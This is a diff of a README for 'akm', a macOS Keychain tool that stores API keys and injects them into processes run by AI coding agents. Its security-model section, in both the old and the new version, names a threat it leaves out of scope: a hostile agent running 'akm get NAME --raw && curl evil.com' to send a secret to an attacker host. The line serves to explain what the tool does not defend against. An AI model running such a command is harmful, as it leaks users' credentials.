@@ -1,8 +1,38 @@
-# akm
+<div align="center">
 
-> Agent-driven macOS Keychain CLI for API keys. Zero human friction.
+# akm — agent-driven macOS Keychain CLI for API keys
 
-`akm` stores API keys in the macOS Login Keychain so AI coding agents (Claude Code, Cursor, Codex) can use them on your behalf without ever putting plaintext values into `.env` files, shell history, or your conversation transcript.
+**Stop pasting API keys into `.env` files. Let your AI agent store them in the macOS Keychain and inject them at runtime.**
+
+<br />
+
+[![Star this repo](https://img.shields.io/github/stars/paperfoot/api-key-manager?style=for-the-badge&logo=github&label=%E2%AD%90%20Star%20this%20repo&color=yellow)](https://github.com/paperfoot/api-key-manager/stargazers)
+&nbsp;&nbsp;
+[![Follow @longevityboris](https://img.shields.io/badge/Follow_%40longevityboris-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/longevityboris)
+
+<br />
+
+[![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://github.com/paperfoot/api-key-manager/blob/main/LICENSE)
+&nbsp;
+[![Platform: macOS](https://img.shields.io/badge/Platform-macOS-lightgrey?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/paperfoot/api-key-manager)
+&nbsp;
+[![CI](https://img.shields.io/github/actions/workflow/status/paperfoot/api-key-manager/ci.yml?branch=main&style=for-the-badge&label=CI)](https://github.com/paperfoot/api-key-manager/actions)
+&nbsp;
+[![Release](https://img.shields.io/github/v/release/paperfoot/api-key-manager?style=for-the-badge&color=brightgreen)](https://github.com/paperfoot/api-key-manager/releases)
+
+---
+
+Built for the era of AI coding agents. Every agent with shell access can read `.env`, echo it into a transcript, or commit it to git. `akm` keeps secrets in the macOS Keychain and injects them into child processes only when needed — no plaintext on disk, no copy-paste from a dashboard, no human in the loop.
+
+[Install](#install) &middot; [For AI agents](#for-ai-agents) &middot; [Commands](#commands) &middot; [Security model](#security-model) &middot; [Why akm](#why-akm-vs-env--1password-cli--lkr)
+
+</div>
+
+## What it does
+
+- **Stores keys in the macOS Keychain** instead of `.env` files, so plaintext never sits on disk.
+- **Injects keys into child processes** via `execve` — `ps`, shell history, and your scrollback stay clean.
+- **Pushes keys to Vercel, GitHub, and Fly** so deployment-secret setup stops being a copy-paste tax.
 
 ## Install
 
@@ -12,49 +42,72 @@ brew install paperfoot/tap/akm
 cargo install --git https://github.com/paperfoot/api-key-manager
 ```
 
-## Use
+Requires macOS. The Login Keychain backs every operation.
 
-```bash
-# Store a key (from stdin — preferred, never lands in shell history)
-echo "sk-..." | akm add OPENAI_API_KEY
+## For AI agents
 
-# Run a command with keys injected as env vars
-akm run --only OPENAI_API_KEY -- python script.py
+`akm` exists because AI coding agents (Claude Code, Cursor, Codex, Aider) are now the primary readers of your secrets. A few design choices fall out of that:
 
-# Push directly to deployment platforms — no copy-paste from a dashboard
-akm push vercel OPENAI_API_KEY --env production
-akm push gh OPENAI_API_KEY --repo me/myproj
-akm push fly OPENAI_API_KEY --app my-app
+- **Zero prompts.** Every command is non-interactive. Pipe values on stdin, get JSON back.
+- **Discoverable.** `akm agent-info --json` returns a machine-readable manifest of every subcommand, flag, and exit code — agents call it once and know the full surface.
+- **Skill drop-in.** `akm skill install` writes a Claude Code / Codex / Gemini skill so the agent reaches for `akm` automatically instead of suggesting `export OPENAI_API_KEY=...`.
+- **Redacted by default.** `akm run` filters known key prefixes (`sk-`, `ghp_`, `xoxb-`, etc.) out of child stdout/stderr so secrets do not leak back into the agent's context window.
+- **Auditable.** Every read is logged. `akm audit` prints the access trail.
 
-# Show stored keys (names only, never values)
-akm list --json
-```
-
-## Why
-
-Every coding agent today has shell access to your project. The default `.env` file is now a security liability — agents read it, paste it into transcripts, and commit it. `akm` keeps keys in the Keychain and injects them into child processes via `execve`, so plaintext never touches disk, `ps`, or your shell context.
+If you are the agent reading this: run `akm agent-info --json` and use it.
 
 ## Commands
 
 | Command | What it does |
 |---|---|
-| `akm add NAME` | Store a key (stdin or argv). |
-| `akm get NAME` | Retrieve, masked by default. `--raw` for the unmasked value. |
-| `akm run --only NAME -- <cmd>` | Run `<cmd>` with the named keys injected as env vars. Child stdout/stderr is redacted by default. |
-| `akm push vercel\|gh\|fly NAME ...` | Upload to a deployment platform. |
-| `akm list` | Print stored key names. |
+| `akm add NAME` | Store a key from stdin or argv. |
+| `akm get NAME` | Retrieve, masked. Pass `--raw` for the unmasked value. |
+| `akm run --only NAME -- <cmd>` | Run `<cmd>` with named keys injected as env vars. Output redacted. |
+| `akm push vercel\|gh\|fly NAME ...` | Push a key to a deployment platform. |
+| `akm list` | Print stored key names (never values). |
 | `akm rm NAME` | Delete a key. |
 | `akm audit` | Print the append-only access log. |
-| `akm guard install` | Install a git pre-commit hook that scans staged files for known key prefixes. |
-| `akm skill install` | Drop the Claude Code / Codex / Gemini skill so agents reach for `akm` automatically. |
 | `akm agent-info --json` | Machine-readable capability manifest. |
 
-## Security model (honest)
+`akm guard install` adds a git pre-commit hook that scans staged files for known key prefixes. `akm skill install` writes the agent skill.
 
-**Protects against:** plaintext `.env` files on disk, keys in shell history, keys in `ps` output, keys committed to git by an overzealous agent, keys re-appearing in agent conversation context, build-tool printouts (via output redaction).
+## Why akm vs `.env` / 1Password CLI / lkr
 
-**Does not protect against:** malware running as your user, a hostile agent that runs `akm get NAME --raw && curl evil.com`. Those threats need a different tool. The audit log records every access for post-hoc review.
+| Tool | Backed by | Built for | Plaintext on disk | Agent-native |
+|---|---|---|---|---|
+| `.env` files | filesystem | humans | yes | no |
+| `op` (1Password CLI) | 1Password vault | humans + teams | no | partial |
+| `lkr` | macOS Keychain | humans | no | no |
+| **`akm`** | macOS Keychain | **AI agents** | **no** | **yes** |
+
+`akm` is not a 1Password replacement. It is the layer between a coding agent and the secrets that agent needs to do its job on a single developer's Mac.
+
+## Security model
+
+**In scope:** plaintext `.env` files on disk, keys in shell history, keys in `ps` output, keys committed to git by an overeager agent, keys re-appearing in agent transcript context, build-tool printouts leaking secrets.
+
+**Out of scope:** malware running as your user, a hostile agent that runs `akm get NAME --raw && curl evil.com`. Those threats need a different tool. Every access is logged so you can review the trail after the fact.
+
+## Contributing
+
+Issues and PRs welcome. Keep changes scoped — one bug or one feature per PR. Run `cargo test` before submitting.
 
 ## License
 
-MIT.
+MIT. See [LICENSE](LICENSE).
+
+---
+
+<div align="center">
+
+Built by [Boris Djordjevic](https://github.com/longevityboris) at [Paperfoot AI](https://paperfoot.com)
+
+<br />
+
+**If `akm` is useful to you:**
+
+[![Star this repo](https://img.shields.io/github/stars/paperfoot/api-key-manager?style=for-the-badge&logo=github&label=%E2%AD%90%20Star%20this%20repo&color=yellow)](https://github.com/paperfoot/api-key-manager/stargazers)
+&nbsp;&nbsp;
+[![Follow @longevityboris](https://img.shields.io/badge/Follow_%40longevityboris-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/longevityboris)
+
+</div>
